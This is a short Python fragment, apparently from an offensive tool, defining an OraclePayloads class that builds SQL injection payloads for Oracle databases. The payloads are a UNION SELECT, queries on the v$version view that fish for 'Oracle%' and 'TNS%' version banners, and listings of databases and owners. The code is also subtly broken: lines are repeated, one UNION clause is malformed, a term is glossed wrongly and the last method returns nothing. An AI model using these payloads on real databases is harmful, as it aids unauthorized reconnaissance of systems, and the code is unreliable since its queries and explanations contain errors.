"""
This SQL command is selecting the global_name column from the global_name table. It will retrieve the values stored in the global_name column for each row in the table. However, without more context or information about the database schema and data, it's difficult to provide a more specific explanation.


"""

class OraclePayloads:
    @staticmethod
    def db_column_payload(column,table):
        payload = f"""

    SELECT {column} FROM {table};
    SELECT {column} FROM {table};
    SELECT {column} FROM {table};
    SELECT {column} FROM {table};
    """
        retval = payload
        return retval
    
    @staticmethod
    def db_column_list(column,ret_table,table):
        payload = f"""
SELECT {column} FROM {ret_table} WHERE {table} = 'blah';
SELECT {column} FROM {ret_table} WHERE {table} = 'blah' and owner = 'foo'; """
        retval = payload
        return retval
    
    @staticmethod
    def oracle_injection_payload(table,column,view,viewcolumn):
        #TODO: create parameters in argprase for indicating table and columns and prompt it from the user
        #!view column : v$version
        #!Oracle% : oracle db version
        #!TNS%: transport network substrate 
        payload = f"""
SELECT {column} FROM {table} UNION SELECT * FROM {column}
SELECT {column} FROM {view} WHERE {column} LIKE 'Oracle%';
SELECT {column} FROM {view} WHERE {column} LIKE 'TNS%';
SELECT {column} FROM {view};
"""
        retval = payload
        return retval
    
    @staticmethod
    def oracle_injection_database_list(column,table):
        payload = f"""
SELECT DISTINCT {column} FROM {table};
 """